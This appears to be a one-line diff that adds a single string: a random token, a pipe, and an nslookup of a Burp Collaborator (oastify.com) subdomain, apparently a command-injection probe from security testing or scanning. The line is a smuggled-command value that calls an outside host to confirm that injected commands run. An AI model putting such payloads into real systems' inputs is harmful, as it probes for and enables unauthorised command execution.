@@ -1,0 +1,1 @@
+tDBt7e8mZQ|nslookup -q=cname an10uj2wo86196o9daw1hrvii9o2cxflb93wwkl.oastify.com.&
